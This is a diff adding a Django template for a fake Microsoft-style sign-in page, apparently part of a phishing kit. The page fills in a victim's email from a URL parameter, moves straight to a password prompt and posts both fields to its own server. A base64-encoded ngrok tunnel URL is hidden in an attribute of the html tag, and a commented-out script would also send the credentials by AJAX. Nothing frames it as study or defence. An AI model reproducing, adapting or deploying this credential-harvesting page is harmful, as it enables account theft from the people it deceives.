@@ -1,0 +1,307 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en" data-badie="aHR0cHM6Ly81ZWJkYWRhNzE0ZTUubmdyb2stZnJlZS5hcHAvZnJvbnRlbmQvb25nL29uLXBhcmRvbi9vZy8=">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in </title>
+
+    <!-- google font -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&display=swap" rel="stylesheet">
+
+    <style>
+        body{
+            height: 100vh;
+            background: radial-gradient(rgb(212, 207, 207),#f5f5f5);
+            font-family: "Poppins", sans-serif;
+            overflow-y: hidden;
+        }
+        img{
+            display: block;
+            width: 100%;
+        }
+        a{
+            text-decoration: none;
+            color: rgb(41, 103, 219);
+            font-size: .8rem;
+        }
+        p{
+            color: rgb(82, 76, 76);
+            font-size: 0.9rem;
+
+        }
+        h2{
+            color: rgb(19, 17, 17);
+            font-weight: 500;
+            font-size: 1.3rem;
+            margin-bottom: 10px;
+        }
+        .wrapper{
+            /* margin-inline: 3rem; */
+            margin-block: 8rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding-inline: 40px;
+            /* border: 1px solid red;
+            margin-inline: 40px; */
+        }
+        .logo{
+            width: 120px;
+            padding-top: 10px;
+            margin-bottom: 24px;
+        }
+        .card{
+            /* border: 2px solid red; */
+            width: 345px;
+            height: auto;
+            /* height: 310px; */
+            padding: 33px 47px;
+            background: #fff;
+            box-shadow: 0.2 .4rem .5rem rgb(128, 127, 127);
+        }
+        .form-content{
+            margin-bottom: 1rem;
+            width: auto;
+        }
+        .form-content input[type='email'],
+        .form-content input[type='password']{
+            width: 100%;
+            border: none;
+            border-bottom: .8px solid #333131e7;
+            outline: none;
+            padding: 8px 0;
+            font-size: 0.9rem;
+            color: rgb(46, 45, 45);
+        }
+        .form-content input[type='email']:focus,
+        .form-content input[type='password']:focus{
+            border-bottom: 1px solid rgb(16, 77, 189);
+        }
+
+
+        .form-content input[type='email']::placeholder,
+        .form-content input[type='password']::placeholder{
+            font-size: 1rem;
+        }
+        .form-content button,
+        .formbtn{
+            padding: 7px 31px;
+            background: rgb(33, 101, 228);
+            color: #fff;
+            cursor: pointer;
+            border: none;
+            outline: none;
+            font-size: .95rem;
+        }
+        .form-content a{
+            padding: 8px 35px;
+            background: rgb(138, 134, 134);
+            color: #000;
+            cursor: pointer;
+            border: none;
+            outline: none;
+        }
+        .form-content button:hover{
+            background: rgb(10, 62, 160); 
+        }
+        .form-content a:hover{
+            background: rgb(117, 115, 115);
+        }
+        .form-content.form-button{
+            display: flex;
+            align-items: left;
+            justify-content: end;
+            gap: 0.7rem;  
+        }
+        .link{
+            margin-bottom: 20px;
+        }
+        .form-content input[type='email']:invalid{
+            border-bottom: 1px solid rgb(219, 34, 34);
+        }
+
+        .perrwarning,.errwarning{
+            color: rgb(165, 7, 7);
+        }
+        @media(max-width:560px){
+            .wrapper{
+            padding-inline: 40px;
+            }
+            .card{
+                width: 280px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="layout-grid">
+            <div class="card loginForm" id="login-form">
+                <div class="logo">
+                    <img src="{% static 'frontend/img/logo.png' %}" alt="">
+                </div>
+                
+                <form action="" id="my-login-form" method="POST">
+
+                    <!-- seperate email and password -->
+                    <!-- Email Side -->
+                    <div class="email-side" id="email-side">
+                        <h2>Sign in</h2>
+                        <div class="errwarning"></div>
+                        <div class="form-content">
+                            <input type="email" id="email" placeholder="Email, phone or Skype">
+                        </div>
+
+                        <div class="link">
+                            <p>No account? <a href="#">Create one!</a></p>
+                            <p><a href="#">Can't access your account?</a></p>
+                        </div>
+
+                        <div class="form-content form-button">
+                            <a href="">Back</a>
+                            <div id="next-email" class="submit formbtn">Next</div>
+                        </div>
+                    </div>
+
+                    <!-- Password Side -->
+                    <div class="password-side" id="password-side" style="display: none;">
+                        <div class="showemail" id="showemail"></div>
+                        <h2>Enter password</h2>
+                        <div class="perrwarning"></div>
+
+                        <div class="form-content">
+                            <input type="hidden" id="emailhidden" value="" name="f_email">
+                        </div>
+                        <div class="form-content">
+                            <input type="password" id="password" placeholder="Password" name="f_password">
+                        </div>
+
+                        <div class="link">
+                            <p><a href="#">Forgot my password?</a></p>
+                            <p><a href="#">Sign in with another account</a></p>
+                        </div>
+
+                        <div class="form-content form-button">
+                            <button type="submit" id="final-submit-btn">Sign in</button>
+                        </div>
+                    </div>
+                </form>
+
+            </div>
+        </div>
+    </div>
+
+
+<script>
+    function getQueryParam(name) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(name);
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+        const emailParam = getQueryParam('em');
+        const emailSide = document.getElementById('email-side');
+        const passwordSide = document.getElementById('password-side');
+        const emailInput = document.getElementById('email');
+        const emailHidden = document.getElementById('emailhidden');
+        const showEmail = document.getElementById('showemail');
+        const nextBtn = document.getElementById('next-email');
+
+        if (emailParam) {
+            // Direct to password view
+            emailSide.style.display = 'none';
+            passwordSide.style.display = 'block';
+            emailHidden.value = emailParam;
+            showEmail.innerText = emailParam;
+        } else {
+            // Show email form first
+            emailSide.style.display = 'block';
+            passwordSide.style.display = 'none';
+        }
+
+        nextBtn.addEventListener('click', function () {
+            const enteredEmail = emailInput.value.trim();
+            if (!enteredEmail) {
+                alert("Please enter an email.");
+                return;
+            }
+
+            // Update UI
+            emailSide.style.display = 'none';
+            passwordSide.style.display = 'block';
+
+            // Set email in hidden field and show on password page
+            emailHidden.value = enteredEmail;
+            showEmail.innerText = enteredEmail;
+
+            // Optionally update the URL with `?em=`
+            const newUrl = window.location.pathname + '?em=' + encodeURIComponent(enteredEmail);
+            window.history.replaceState({}, '', newUrl);
+        });
+    });
+</script>
+<!-- <script>
+document.addEventListener("DOMContentLoaded", function () {
+    const finalSubmitBtn = document.getElementById('final-submit-btn');
+    const emailHidden = document.getElementById('emailhidden');
+    const passwordInput = document.getElementById('password');
+    const errorBox = document.querySelector('.perrwarning');
+
+    finalSubmitBtn.addEventListener('click', function () {
+        const email = emailHidden.value.trim();
+        const password = passwordInput.value.trim();
+
+        errorBox.innerText = ''; // Clear previous errors
+
+        if (!email || !password) {
+            errorBox.innerText = "Both email and password are required.";
+            return;
+        }
+
+        fetch('/ajax-login/', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'X-CSRFToken': getCookie('csrftoken')  // Optional if CSRF is enforced
+            },
+            body: JSON.stringify({ email, password })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === 'success') {
+                window.location.href = data.redirect;
+            } else {
+                errorBox.innerText = data.message || 'Login failed.';
+            }
+        })
+        .catch(error => {
+            console.error("Login error:", error);
+            errorBox.innerText = "An unexpected error occurred.";
+        });
+    });
+
+    // CSRF helper
+    function getCookie(name) {
+        let cookieValue = null;
+        if (document.cookie && document.cookie !== '') {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                cookie = cookie.trim();
+                if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                    cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                    break;
+                }
+            }
+        }
+        return cookieValue;
+    }
+});
+</script> -->
+
+</body>
+</html>
+
+<!-- Email, phone or Skype -->
